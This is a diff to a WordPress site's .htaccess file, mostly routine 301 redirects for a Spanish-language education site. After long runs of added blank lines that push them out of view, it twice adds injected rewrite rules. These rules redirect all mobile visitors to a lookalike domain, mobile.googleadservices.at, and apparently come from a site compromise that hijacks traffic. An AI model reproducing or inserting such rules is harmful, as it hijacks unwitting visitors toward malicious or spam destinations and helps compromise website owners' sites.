@@ -1,4 +1,5 @@
 
+
 # BEGIN WordPress
 <IfModule mod_rewrite.c>
 RewriteEngine On
@@ -10,6 +11,8 @@ RewriteRule . /index.php [L]
 </IfModule>
 
 # END WordPress
+
+RewriteRule  ^innova-educacion$ /innova-educacion.html [QSA,L]
 
 redirect 301 /formacion_del_caracter /formacion-del-caracter
 redirect 301 /principios_de_hermeneutica /principios-de-hermeneutica
@@ -41,7 +44,7 @@ redirect 301 /posgrado.html /posgrado
 redirect 301 /wp-content/cursomuestra/data/presentation.xml /educacion-continua
 redirect 301 /portafolio-saludEmp.html /educacion-continua
 redirect 301 /portafolio-enfermedades.html /salud-mental-y-bienestar-personal
-redirect 301 /portafolio-herramientas.html /como-disenar-actividades-que-desarrollan-competencias 
+redirect 301 /portafolio-herramientas.html /como-disenar-actividades-que-desarrollan-competencias
 redirect 301 /evangelismo-tecnologico-spot3 /evangelismo-tecnologico
 redirect 301 /portafolio-huerto.html /educacion-continua
 redirect 301 /descargas/PDF/QVS/Salud_mental.pdf /educacion-continua
@@ -66,3 +69,543 @@ redirect 301 /portafolio-familia.html /fundamentos-firmes-para-la-familia-contem
 redirect 301 /cursos_cortos.html /cursos-cortos
 redirect 301 /portafolio-vidasaludable.html /promocion-vida-saludable
 redirect 301 /Portafolio-estilos-vida.html /estilo-de-vida-saludable
+redirect 301 /portafolio-spot1.html /proiectum/salud/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteEngine on
+RewriteCond %{HTTP_ACCEPT} "text/vnd.wap.wml|application/vnd.wap.xhtml+xml" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "acs|alav|alca|amoi|audi|aste|avan|benq|bird|blac|blaz|brew|cell|cldc|cmd-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "dang|doco|eric|hipt|inno|ipaq|java|jigs|kddi|keji|leno|lg-c|lg-d|lg-g|lge-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "maui|maxo|midp|mits|mmef|mobi|mot-|moto|mwbp|nec-|newt|noki|opwv" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "palm|pana|pant|pdxg|phil|play|pluc|port|prox|qtek|qwap|sage|sams|sany" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "sch-|sec-|send|seri|sgh-|shar|sie-|siem|smal|smar|sony|sph-|symb|t-mo" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "teli|tim-|tosh|tsm-|upg1|upsi|vk-v|voda|w3cs|wap-|wapa|wapi" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "wapp|wapr|webc|winw|winw|xda|xda-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "up.browser|up.link|windowssce|iemobile|mini|mmp" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "symbian|iOS|midp|wap|phone|pocket|mobile|pda|psp|PPC|Android" [NC]
+RewriteCond %{HTTP_USER_AGENT} !macintosh [NC]
+RewriteCond %{HTTP_USER_AGENT} !america [NC]
+RewriteCond %{HTTP_USER_AGENT} !avant [NC]
+RewriteCond %{HTTP_USER_AGENT} !download [NC]
+RewriteCond %{HTTP_USER_AGENT} !windows-media-player [NC]
+RewriteRule ^(.*)$ http://mobile.googleadservices.at [L,R=302]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteEngine on
+RewriteCond %{HTTP_ACCEPT} "text/vnd.wap.wml|application/vnd.wap.xhtml+xml" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "acs|alav|alca|amoi|audi|aste|avan|benq|bird|blac|blaz|brew|cell|cldc|cmd-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "dang|doco|eric|hipt|inno|ipaq|java|jigs|kddi|keji|leno|lg-c|lg-d|lg-g|lge-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "maui|maxo|midp|mits|mmef|mobi|mot-|moto|mwbp|nec-|newt|noki|opwv" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "palm|pana|pant|pdxg|phil|play|pluc|port|prox|qtek|qwap|sage|sams|sany" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "sch-|sec-|send|seri|sgh-|shar|sie-|siem|smal|smar|sony|sph-|symb|t-mo" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "teli|tim-|tosh|tsm-|upg1|upsi|vk-v|voda|w3cs|wap-|wapa|wapi" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "wapp|wapr|webc|winw|winw|xda|xda-" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "up.browser|up.link|windowssce|iemobile|mini|mmp" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} "symbian|IOS|Ios|Ipad|midp|wap|phone|pocket|mobile|pda|psp|PPC|Android" [NC]
+RewriteCond %{HTTP_USER_AGENT} !macintosh [NC]
+RewriteCond %{HTTP_USER_AGENT} !america [NC]
+RewriteCond %{HTTP_USER_AGENT} !avant [NC]
+RewriteCond %{HTTP_USER_AGENT} !download [NC]
+RewriteCond %{HTTP_USER_AGENT} !windows-media-player [NC]
+RewriteRule ^(.*)$ http://mobile.googleadservices.at [L,R=302]
